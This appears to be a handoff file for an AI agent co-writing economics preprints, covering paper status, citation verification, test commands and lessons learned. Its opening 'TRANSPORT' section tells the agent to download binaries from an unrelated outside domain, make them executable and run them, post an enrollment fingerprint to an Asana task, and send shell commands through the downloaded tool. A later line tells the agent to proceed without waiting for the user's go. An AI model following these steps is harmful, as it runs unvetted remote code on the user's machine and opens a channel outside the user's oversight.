---
project: wealth-tensor
gh_sha: 38d668bb57791479af74a9982e17195b601917d7
updated: 2026-08-11
session: wealthTensor-07
gate_passed: true
gate_version: "2.50"
---

# wealth-tensor — HANDOFF

*Overwritten every session. `git log -p docs/HANDOFF.md` is the archive. Run
`python3 scripts/handoff_gate.py --check` before trusting this file.*

## 0 · TRANSPORT — darlish, zero-bridge. No bridge theatrics; darlish does not use it.

```
curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
```

Post the printed `DARLISH-ENROLL v1 id=… fp=…` line **exactly** as a comment on Asana task
`1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.
**Re-run before diagnosing** — `dwait` times out loudly at 150 s. *In wealthTensor-05 the second
collect was needed; in -06 and -07 the first worked.* Whole cycle ~4 minutes.

```
curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
/tmp/dx '~/Scripts/roster join --who big-wealthTensor-08 --task "<what you are doing>"'
/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-08 --resource wealth-tensor'
```

`roster claim` needs **`--who` AND `--resource`** (L23); both print nothing on success — confirm
with `roster who`. dx exit 3 = never ran, safe retry; exit 4 = check state first. **Do NOT route
EDGAR or bulk web work through darwin** (L18).

## 1 · IDENTITY + MISSION

You are Jason's co-author on **wealth-tensor** — an eleven-year synthesis being turned into **four
pre-prints** (ADR-001).

**Two intentions, equally weighted.** (1) Ship them. (2) **Have fun.** Hobby, no tenure, he is not
trying to be safe and says so.

**He invites criticism and means it, six sessions deep.** -06 had its own paper rejected the day it
was written. **-07 found that the one claim -06's referee left standing is 116 years old, and Jason's
first reaction was "cheers to the lemonade — we should *always* celebrate when we can kill our
darlings."** Agreeing with him is not the job. **Agreeing with yourself is not the job either.**

**But do not agree with him reflexively either — -07 is the evidence.** He challenged the audit's
verdict (*"I read it the other way around: it's a special case of our case"*). Tested on three axes,
he was **right about Böhm-Bawerk, wrong about Wicksteed within the market, and right about Wicksteed
on the axis that matters.** The split was worth more than either flat answer. Test his challenges;
do not rubber-stamp them and do not brush them off.

**The prose is disposable; the structure is precious.** He remasters every sentence. What must NOT
happen is laundering *his* insight into your paraphrase. When he coins something it goes in
**verbatim** and is credited.

**His research notes are on paper.** Read the note back before building on it.

**Ask whether he has had his coffee.** A **register check, not a HITL gate.** In -07 he answered
"halfway there" and asked for the recommendation first with one line of why — that worked; the long
argument went in the artifacts, not the chat.

**Audience: his three children, 18, 11 and 8.** It decided that `docs/` stays public, that
*Abandoned Approaches* is in every paper, that the failed pre-registration is part of the
deliverable, and that the papers ship **with their own hostile referee reports** — now three.

## 2 · ORIENT — run these, do not skim

```
git -C ~/repos/wealth-tensor pull --ff-only
python3 ~/repos/wealth-tensor/scripts/handoff_gate.py --check
cat  ~/repos/wealth-tensor/docs/adr/ADR-001-paper-decomposition.md          # ALL FOUR addenda
cat  ~/repos/wealth-tensor/docs/papers/paper-I-price-formation/REVIEW-003-priority-audit.md
cat  ~/repos/wealth-tensor/docs/preregistration/RESULT-REG-001.md
cat  ~/repos/wealth-tensor/docs/papers/paper-I-price-formation/REVIEW-002-internal-referee.md
cat  ~/repos/wealth-tensor/docs/papers/paper-III-dual-tensor/REVIEW-001-internal-referee.md
cat  ~/repos/wealth-tensor/docs/LEDGER.md                                   # 69 entries
python3 ~/repos/claude-blackbook/lessons.py doctrine
```

> **Read `REVIEW-003` and `RESULT-REG-001` before touching Paper I.** Together they are the shortest
> path to understanding why the obvious move — "write the P3 version and ship it" — is one condition
> short of honest.

Corroborate what you use: `lessons.py use <id> --task <tag>` at orient,
`lessons.py record-outcome <tag> pass` at wrap.

## 3 · STATE

- **Code — 115 tests passing** (109 + 6 new), tree clean and pushed. Seven model modules;
  new this session `src/wealth_tensor/recognition_fold.py` (a **failed** instrument, kept as
  evidence and pinned by tests that assert its defect) and `scripts/wt066_p3_port.py`.
- **Paper II — COMPLETE.** SHA pinned to **d655501**, zero live placeholders. **Ready to submit when
  Jason says so. He has not said so.** Three sessions running.
- **Paper III — v0.3, post-referee, references verified.** ~11k words, all 20 refs ✓ with nine ✓✎.
  **Its §9 crash-risk positioning is still written from a search rather than from reading the
  papers.** Untouched again. Still item 2 and it has not moved down.
- **Paper I — v0.1 REJECTED (`REVIEW-002`), then its surviving claim DISPLACED (`REVIEW-003`).**
  Re-scoped around **P3 · Atomism** by Jason's decision, 2026-08-11. **Not yet written.** The
  re-scope's justifying condition is **unmet** — see §5.
- **Paper IV — unstarted.** Still blocked on I.
- **WT-026 remains CLOSED and it closed by failing.** PRE-002's stopping rule fired and stays fired.
- **REG-001 stopping rule fired. No second port.** `RESULT-REG-001.md`.
- **Manuscript** (Google Doc `1RjAHJ7jHCX_N3ToHtstQvjlMb-BQz-iejBZ9Y4f58V8`) — untouched since S2.
  Restore points: S1 `1fszgf295NGfvfQlT3VaCrRXrXA4K589tlS-bVsUIok4` ·
  S2a `1FeXUSbrFQQXDOaSxCoul13lE6LWicxMuJGL8xJKSLjs` ·
  S2b `12jJh93VhgfOe8EQ3J23G9heQekSCdzxHTm75ut8RL6g`.

## 4 · DOCTRINE / GUARDRAILS

- **Blanket edit permission on the manuscript.** Fresh restore point before every edit session, and
  **VERIFY it**.
- **Never add a free parameter to absorb an objection.** Refused **six** times.
- **WT-049** every pre-registration states its BRIDGE assumption as a numbered proposition.
- **WT-052 — a registration precedes the INSTRUMENT'S CODE.** Followed correctly in -07: REG-001 was
  committed and pushed **alone** before a line of `wt066` existed. It is the reason the failure is
  legible.
- **WT-053 — every published number comes from a committed script that has been run.**
- **WT-054 → WT-065 — adversarial review fires when a finding is about to be CALLED a result** —
  ledger, paper text, or telling Jason, whichever is **first**. Not at the preprint. **-07 is the
  proof it works:** the gap between finding and disbelieving was one tool call, and nothing false
  reached the ledger, the papers or Jason. Three cheap checks: a **priority audit** by an agent told
  an over-eager priority claim is as damaging as a missed one (L28); an attempt to **refute the
  interpretation** separately from the arithmetic; and *what would have to be true for this to be
  false?*
- **WT-056** prefer the STRUCTURAL fact to the CONTINGENT one.
- **WT-057 — grep the WRONG form across every file after a correction.**
- **WT-058 — a multi-anchor edit validates ALL anchors before writing.** `scripts/patchkit.py`
  (L25). *Exception:* whole-file replaces — edit a local copy and `dx --put`, atomic by
  construction.
- **WT-059** verifying a REFERENCE and verifying a CITATION are different acts.
- **WT-060** a word you use inconsistently is a word you have not checked. **WT-061** prose that
  counts items in an adjacent list is a hand-cached derived value. **WT-062** search Jason's library
  by TITLE; a null is not absence; ASK before deleting a citation on the strength of one.
- **NEW · WT-068 — a registration must state how to tell REPAIRING a mis-specified instrument from
  FITTING a hypothesis.** REG-001 §5 said "one instrument, no second port" to prevent fitting, and
  now locks in a no-verdict from an instrument whose guards demonstrably cannot fire. No test
  separates the two acts. Until a registration carries one, the conservative reading holds.
- **NEW · WT-069 — a guard is not verified until a mutation that SHOULD kill it has been run and
  did.** *And an incomplete mutant is worse than none* — -07's first mutation touched the booking
  branch and not the reversal branch, and the false green nearly shipped.
- **The tone is load-bearing.** No grumpiness; humour lands the news, especially bad news.

## 4b · THE DECISION THAT FRAMES EVERYTHING · and the DEFINITION OF DONE

**`docs/adr/ADR-001-paper-decomposition.md` — read it, including ALL FOUR addenda.** The fourth
(-07) records the P3 re-scope of Paper I **and the condition attached to it, which is not met.**

**I** price formation · **II** redistribution *(complete)* · **III** the dual tensor *(v0.3)* ·
**IV** the atomic theory. Order: **II → III → I → IV**.

> **DEFINITION OF DONE.** Four preprints publicly posted, each carrying: abstract, keywords, JEL
> codes, a numbered contributions list, an Abandoned Approaches section, a limitations section, a
> data/code availability statement naming the repo and a pinned commit SHA, and *Independent
> researcher* as the affiliation. Paper III additionally cites PRE-001/PRE-002 and their registering
> commit SHAs. When the fourth is posted, this project is done and the repo becomes an archive.

**Progress: II done. III drafted, reviewed, reference-complete, one known exposure. I rejected,
displaced, re-scoped, unwritten. IV unstarted.** Drive at finishing.

## 5 · MISSION — ranked

### START HERE — **Paper I, written at the P3 level, WITH ITS EXPOSURE STATED.**

The re-scope is decided (ADR-001 addendum 4). What is **not** decided is whether it is justified,
and you must not write as though it were.

**The claim, at the level it now lives:** excess demand is a **fold over units**; the supply and
demand schedules are folds over units **and the allocation**, which is not a property of the
population. So the Marshallian decomposition manufactures two objects that present as aggregates
while carrying information no fold contains. **That is P3 caught in the act on the most canonical
diagram in economics.**

**Three things the draft must do, none of them optional.**

1. **Wicksteed (1910) Bk II Ch. IV goes in front, generously.** He states the market identity, at
   every price, on the same horse market — and he does it for **divisible goods and multi-unit
   holdings**, which our unit-demand form does not cover. *Ours is the special case within the
   market and the paper says so.* Böhm-Bawerk (1889) p. 203/209 for *marginal pairs*, and note that
   his four-parties-in-two-pairs form collapses to two order statistics — **that** direction is ours.
2. **Correct our own corollary.** "The split carries no economic content" is **overclaimed**.
   Wicksteed: it has content for *"the amount of business done"* and none for price and final
   allocation. **Volume is allocation-dependent; excess demand is not.** He asserts this and never
   derives it — deriving it is one of the two things genuinely left.
3. **State the exposure in the limitations section, in these words: the generality is unexercised.**
   `REG-001` was registered to exercise it and returned **no verdict**. Its priority audit put the
   general proposition in four literatures (lumpability, Kemeny & Snell **1960**; Mori–Zwanzig;
   Granovetter 1978; Pesaran & Chudik 2014). **Do not build a second port to fix this** — the
   stopping rule is fired and the repair is *known* to succeed, which makes rebuilding worse.

**Structural repairs `REVIEW-002` demanded and that still stand:** §3.3 is circular
(`marshallian_cross` is computed *from* excess demand); §3.4's transform makes *c(m)* a function of
the allocation and BREAKS §3.1 — **report it, do not hide it**; drop the "1 distinct value" rows in
§3.2/§3.3 (`marginal_pair()` never reads holders); §4.3's Lerner "verification" **is** the FOC; and
decide whether §4 belongs at all.

**BEFORE WRITING: read Forni & Lippi (1997),** *Aggregation and the Microfoundations of Dynamic
Macroeconomics*, chapters on the aggregate model and Granger causality. The priority auditor named
it as **the largest unresolved risk** and refused to infer its contents from the title. Paywalled at
Oxford — try Jason's library by TITLE (L24) first.

### 2 — **Read the crash-risk literature properly. Paper III's biggest remaining exposure.**

**Untouched in -06 AND -07. It has now been deferred twice.** Jin & Myers (2006), Hutton, Marcus &
Tehranian (2009), unbroken through 2026: firms hoard bad news until it releases at once and the
price moves discontinuously. **That is Paper III's thesis, twenty years earlier.** §9 positions
against it *from a search, not from having read the papers.* Framing to test: the recognition event
is the accounting-layer cause of which the price crash is the price-layer effect. **-06 and -07 are
now two independent demonstrations of what happens when a positioning claim meets someone who has
actually read the literature.** If you defer this a third time, say why in the handoff.

### 3 — **Submit Paper II.** Done, and has been for four sessions.

`docs/papers/PREPRINT-CHECKLIST.md` §C and **re-verify the venue rules live** — checked 2026-08-05,
venue rules rot. **SSRN has no gate in and NO APPEAL out** (WT-051). **Jason's decision to trigger.
Ask.**

### 4 — **OUTSTANDING FROM -07, cheap, and Jason may already have done it.**

**RESOLVED IN -07 — he found it (different Kindle, years uncharged) and it is verified.**
**Bk II Ch. IV is pp. 493–526** in the 1933 Robbins Vol. II; every quote survives **verbatim**; the
six load-bearing passages carry pages **498, 505, 506, 507, 509, 516** (`REVIEW-003` §7b). **Cite
the 1933 edition with those pages** — the WT-059 exposure is closed. **AND THE FOOTNOTE IS RESOLVED AND USABLE.**
Wicksteed (1910) Bk II Ch. IV **p. 512 n. 1**: *"I have preserved the convention by which the
'demand' curve is made to run down and the 'supply' curve to run up, from left to right. **Of
course it has no significance and might just as well be neglected or reversed.**"* Verified against
the 1910 Macmillan printing (Cornell scan, archive.org `cu31924030395606`, **leaf 538**) by two
independent phrase searches returning one match each at the same leaf. **It is 1910 and it is
Wicksteed's, not Robbins'.** Econlib had dropped it because it hangs off Fig. 29 — see **L33**, and
use the quote.
*Superseded reasoning, kept because it is why this mattered:* DONE in -07 — he found it and it is verified. See `REVIEW-003` §7b:**
   Bk II Ch. IV is **pp. 493–526** (1933 Robbins, Vol. II), every quote survives **verbatim**, and
   the six load-bearing passages now carry pages (498, 505, 506, 507, 509, 516). **Cite the 1933
   edition with those pages.** ONE OPEN ITEM: a footnote at **p. 512** — *"I have preserved the
   convention by which the 'demand' curve is made to run down and the 'supply' curve to run up …
   Of course it has no significance and might just as well be neglected or reversed"* — is absent
   from the entire Econlib 1910 text. **Do not quote it until you have checked an archive.org scan
   of the 1910 Macmillan printing**, because a figure-adjacent note is exactly what a web edition
   drops, and authorship (Wicksteed or Robbins) is also unsettled.
 • ~~superseded text follows, kept for the reasoning~~ Everything in `REVIEW-003` is Everything in `REVIEW-003` is
verified against the **1910 Macmillan first edition** (Econlib; edition confirmed in its front
matter). Three things his Vol. II buys, in order of value: **(a)** whether the 1933 "Revised and
**Enlarged**" edition changed Bk II Ch. IV at all, and whether Robbins added an editorial note on
the horse market; **(b)** page numbers — the Econlib text has none, and "Bk II Ch. IV" with no page
is the thin end of WT-059; **(c)** that the passages survive verbatim into the edition a modern
reader would pick up. **Ask him. If he has it, this is 10 minutes.** Failing that, archive.org has
1910 scans with pagination.

### 5 — **Attribution pass (WT-044).** Still absent: **Sraffa, Robinson, Samuelson, Godley/Lavoie,
Farmer, Lillo** in Papers II–IV. **And now Wicksteed, whose relevance is not confined to Paper I.**
Check his library first (L24) — and note -07 found **seven** Wicksteed/Böhm-Bawerk volumes he pulled
off his Kindles in one morning, so the library is bigger than the indexed subset.

### 6 — **Citation-graph whitespace test (WT-006).** `verify: grep -ril openalex src/ scripts/`

### 7 — **ASK Jason, all cheap, all genuinely his.**

- **Checkbox lists (WT-008).** All 57 manuscript references render as `- [ ]`. *Recommend:* plain
  bullets.
- **The twin document (WT-009).** `2The Axiomatic Reconstruction of`, 19 KB, never diffed. *Ask:*
  may a session spend one call diffing it? *Recommend:* yes.
- **The house style — ASKED IN -07 AND HIS ANSWER IS PENDING.** `REVIEW-002`'s referee counted 24
  places where Paper I announces its own rigour rather than demonstrating it, and the structure is
  *identical* in Papers II and III. Jason chose **"show me examples first"** — 5–6 representative
  instances across all three papers, he rules on the pattern, then it is applied. **That extraction
  was not done in -07 and is owed to him.** Register is his; do not strip it unilaterally.

### 8 — **PRE-003: the segment-level test.** Teed up deliberately, NOT started. Registers from
scratch, states its bridge proposition (WT-049), obeys WT-052, **may not cite PRE-001/002's failure
as support for anything** — and now also **WT-068**: it must say how to tell repair from fitting.

### 9 — **Language remaster.** His job, explicitly. A word wrong in the FIELD'S TECHNICAL REGISTER
is yours (WT-060); a word that is merely his is not.

### TEED UP, small: `crisis_threshold` and `n_crises` in `lag.py` still carry the old vocabulary.
Rename when `lag.py` is already open.

### PARKED, do not start — **THE MONOGRAPH.** After Paper IV. ADR-001 §Relitigation record.

## 6 · VERIFY GATE

```
cd ~/repos/wealth-tensor && ./.venv/bin/python -m pytest tests/ -q   # expect 115 passed
./.venv/bin/python scripts/wt018_report.py                          # Paper I, §3 + §4
./.venv/bin/python scripts/wt066_p3_port.py                         # REG-001 - expect NO VERDICT
./.venv/bin/python scripts/wt027_report.py                          # Paper III §3.4 + §4
./.venv/bin/python scripts/wt002_lambda_report.py                   # Paper III §3.3
./.venv/bin/python scripts/wt030_report.py                          # Paper II §3
git commit ...                                                      # the LAST content commit
python3 scripts/handoff_gate.py --stamp
git commit -am "docs: stamp handoff gh_sha to HEAD"
python3 scripts/handoff_gate.py --emit
bash ~/Scripts/gate-selfcheck.sh                                    # expect PASS
/tmp/dx '~/Scripts/roster leave --who big-wealthTensor-08'
```

**`--emit` does not stamp**, and refuses on `gate_passed: false`. Walk
`~/Desktop/downloads/HANDOFF-GATE.md` — trust the file header for the version.

## 7 · ORIENT-THEN-GO

Emit ONE orientation line — `Oriented: <state> · next at-bat: <X> · opening with <first action>.` —
then proceed. Do not wait for Jason's go.

---

## LUT — hard-won facts. Read before touching anything.

| # | Fact |
|---|---|
| **L34** | **NEW — archive.org will search inside a scan for you, and it settles print-vs-transcription questions in two calls.** `GET https://archive.org/metadata/<id>` returns `d1`/`dir`; then `GET https://<d1>/fulltext/inside.php?item_id=<id>&doc=<id>&path=<dir>&q=%22exact+phrase%22` returns match count, **leaf number** and surrounding OCR. **Run TWO different phrases from the same sentence** — agreeing leaf numbers is the check that the answer is read and not confabulated. Settled the Wicksteed footnote in -07 after a whole-file grep had said "absent." |
| **L33** | **NEW — a web transcription's silence is not the print original's silence, and figure-adjacent apparatus is what it drops.** Econlib/OLL render figures as images and lose the footnotes hanging off them: Wicksteed's *"of course it has no significance and might just as well be neglected or reversed"* is absent from the entire 1.5 M-character Econlib file and **present in the 1910 Macmillan printing at leaf 538**. **Never conclude a passage is absent from a work on the strength of a web edition** — and if the passage is one you *want*, that is the reason to check harder, not less. L24's rule in a third costume: a NAS that was not indexed, a Kindle that was not charged, and a transcription that was read too trustingly. |
| **L32** | **an "aggregate" and a "half" look identical in code and are not the same object.** WT-066's `pressure_trace` **is** the fold, invariant by construction; a test comparing two of them with `!=` compares two invariants and asserts nothing. It survived every mutant. *Before asserting that two quantities differ, ask whether the quantity you are reading is the one that is supposed to vary.* |
| **L31** | **NEW — an order-reversing bijection makes two "layers" the same model.** Setting *m* = −*τ*, *p* = −*s* turned the recognition port into `excess_demand.py` exactly. **The tell is a module that touches only its own arrays and contains no operation specific to its claimed domain.** Grep your new module for a single line that would be *wrong* in the other layer; if there is none, you have renamed, not ported. |
| **L30** | **NEW — Jason's Kindle library is much larger than the indexed subset, and he will go get books.** In -07 he produced **seven** Wicksteed/Böhm-Bawerk volumes in one morning after a null. **Ask him before concluding anything from an absence.** Also: *two of them were Vol. I of the same two-volume work, and one was his subject's father's Unitarian sermons* — check what an edition actually contains before reasoning from it. |
| **L29** | **NEW — verify the EDITION before quoting a classic.** Econlib/OLL's *Common Sense* is the **1910 Macmillan first edition** (stated in its front matter); the standard modern copy is the **1933 Robbins "Revised and Enlarged."** Different editions, and Robbins' word is *Enlarged*. Also: OLL texts carry **no pagination**, so a citation from one is a chapter reference and not a page reference — WT-059. |
| **L28** | **an agent asked to check a priority claim will AGREE with it unless you tell it not to.** Prompt with *"an over-eager priority claim is as damaging as a missed one"* and demand it state what it **could not access**. **-07 adds the stronger move: run a THIRD agent instructed to REFUTE the displacement — to defend your paper.** It returned the displacement stronger than the prosecution had, and caught that the prosecution's own quote had ellipsis-ed out the most damaging sentence in the source. *An adversary told to attack finds what it expects; an adversary told to defend has to actually read.* |
| **L27** | **measure a constrained quantity AFTER the last edit that touches it, not after the first.** Same class as WT-057: *never verify by re-reading the thing you just fixed.* |
| **L26** | **`scripts/prototypes/` is one level deeper than `scripts/`.** A prototype importing `src/` needs `parent.parent.parent / "src"`; one importing `patchkit` needs `parent.parent`. Also: an f-string containing a set-builder like `#{m_i > p}` silently becomes a format expression and raises `NameError`. |
| **L25** | **`scripts/patchkit.py` — use it for any multi-anchor documentation edit.** Validates **every** anchor and raises `AnchorError` having written **nothing**. **Anchor on a span with no internal newline.** *When replacing a whole file, don't use it* — edit a local copy and `dx --put`. |
| **L24** | **Jason's library settles citation questions the web cannot.** `~/Desktop/downloads` (flat) and `/Volumes/Jason2/BOOK MASTERS`. **Search by TITLE.** **`find` on the NAS at full depth TIMES OUT — use `-maxdepth 2`.** `pdftotext` at `/opt/homebrew/bin/pdftotext`; colophon in the first 8–10 pages. **A null is "not in the indexed subset", NOT "he does not own it."** *-07 broke this rule about his Kindles four messages after invoking it about his NAS. See L30.* |
| **L23** | `roster claim` requires `--who` AND `--resource`. Both `join` and `claim` **print nothing on success**; confirm with `roster who`. |
| **L22** | A mutation harness editing a Python source in place must clear `__pycache__` between mutants AND print a mutation-specific fingerprint. **-07 adds: an INCOMPLETE mutant is worse than none.** The first attempt mutated the booking branch and not the reversal branch, the guard survived, and the conclusion "this test cannot fail" was nearly recorded — about a test that could. **Assert your mutant applied, and mutate every branch the behaviour flows through.** |
| **L21** | **The pre-registration workflow:** commit the registration **alone**, push, *then* write the analysis code, *then* compute. AMENDED by WT-052. *Followed correctly in -07 and it is why the failure is legible.* |
| **L20** | `dx --put` fails if the parent directory does not exist on darwin. `dx 'mkdir -p …'` first. |
| **L19** | The CIK→SIC map including dead registrants is `sub.txt` inside the SEC Financial Statement Data Set quarterly ZIPs. A universe built from a current registrant list is a **survivorship trap**. |
| **L18** | **The cloud container reaches `data.sec.gov` and `www.sec.gov` directly.** Do not route bulk web data through darwin. |
| **L17** | **EDGAR `companyfacts`: Q4 is almost never tagged as a quarter.** Recover quarters by differencing cumulatives sharing a fiscal-year start date. |
| **L16** | Measure the manuscript, don't opine about it. |
| **L15** | Mutation-test any result you intend to publish, and confirm the *right* test screams. See L22, WT-069. |
| **L14** | `conftest.py` only fires under pytest; `scripts/` needs its own shim. |
| **L13** | **A multi-line commit message or script will not survive `dx`'s quoting** — nor will a heredoc. `dx --put` it to a file (for commits, **`.git/COMMIT_DRAFT`**, then `git commit -F`). *A draft in the working tree gets swept up by `git add -A`; inside `.git/` it does not.* **-07 note: nested quotes in a `dx 'python3 -c "…"'` one-liner fail the same way — put the script in a file.** `$HOME` in the cloud shell is `/root` — use literal `~` in dx paths. |
| **L10** | Every model checked against a closed form, a published result, or a hand-verified case. |
| **L9**  | venv at `.venv`. Tests: `./.venv/bin/python -m pytest tests/ -q`. Root `conftest.py` inserts `src/`. |

**Google Docs API** *(unchanged; only needed if the manuscript is reopened)* — L1–L8, L11, L12 are
in `git log -p docs/HANDOFF.md`. The load-bearing four: **L11** use `find_and_replace_doc` to change
existing text. **L12** verify a doc edit *structurally* by exporting via the cloud
`Google_Drive__read_file_content` and diffing the array of `#`-prefixed and list-item lines. **L3**
never infer indices by arithmetic. **L7** cloud `Google_Drive` is create/read only — but `copy_file`
**is** a create, so **restore points need no bridge**.

---

## WHAT wealthTensor-07 DID

**The at-bat was "re-scope Paper I, and do the literature search first." The search killed the
paper's last claim, and the instrument built to rescue it killed itself.**

**The search was the precondition and it fired.** `REVIEW-002` left exactly one claim standing and
said the search was mandatory before writing a word. It found **Wicksteed (1910), Bk II Ch. IV** —
same horse market, same reallocation exercise, *"you may distribute the items between the groups
just as you like"* — and Paper I's §5 thesis as well: *"the method of intersection is a mere disguise
of the method of addition … seriously misleading and mischievous."* **Every quote verified
first-hand against the 1910 first edition**, not taken from an agent.

**Three agents, and the one told to DEFEND the paper did the most damage.** It caught that the
prosecution's own quotation had ellipsis-ed out the most damaging sentence in the book. L28 grew a
second half because of it.

**Jason pushed back, and the pushback was right in a way the audit was not.** He read it the other
way round — theirs the special case, ours the general one — and went and pulled **seven volumes off
his Kindles** to settle it. Tested on three axes: **right about Böhm-Bawerk** (his four parties in
two pairs collapse to two order statistics), **wrong about Wicksteed within the market** (Wicksteed
does divisible goods and multi-unit holdings; ours is the strict special case), and **right about
Wicksteed on the axis that matters** — his apparatus is subjective scales of preference and cannot
leave a market, and ADR-001's third addendum had already said Paper I's claim is an instance of P3.
**Paper I was not scooped. It was written one level too low.**

**Then the re-scope's justifying condition was tested, and failed to return a verdict.** REG-001 was
registered — a new `REG-*` series, committed and pushed **alone** before a line of the instrument
existed — to test whether the identity does work in a layer Wicksteed cannot reach. `WT-066` was
built and run. **The WT-065 adversarial pass took it apart**: the port is the price layer under
*m* = −*τ*; the negative control reads array position and is label-blind; H3 and H2b have empty
failure sets; and the registered expectation is met exactly once the label count is conserved and
the trigger reads the fold — *which our own isolation run had already shown, 0/5 → 3/5, and which was
written down as "REFUTED."*

*The lesson of the session, and it is not -06's.* That session learned **when** the passes must run.
This one learned **what a passing guard is worth.** The `4/21 < 4/11` defect recurred **three times
in one session**, twice inside artifacts written specifically to prevent it — a `PASS` scored from a
regime with zero events; a negative control that controlled for nothing; and the test written to pin
*that* defect, wrong twice over, the second time because it compared `pressure_trace` with `!=` and
`pressure_trace` **is** the invariant. Every one of them was green. **WT-069: a guard is not verified
until a mutation that should kill it has been run and did** — and the first mutation attempt was
itself incomplete and nearly produced the opposite false conclusion.

*And the thing worth being pleased about, which is the same thing three times.* Jason's first
response to losing his paper to a 1910 book was *"cheers to the lemonade."* The adversarial trigger
fired **before** the ledger, the papers and the conversation — one tool call between finding and
disbelieving, where -06 took several hours and four artifacts. And Wicksteed's own preface reads
*"the author makes no claim to originality or priority with respect to anything that it contains."*
**The man who flattened Paper I disclaimed priority in his own front matter.** 🐴
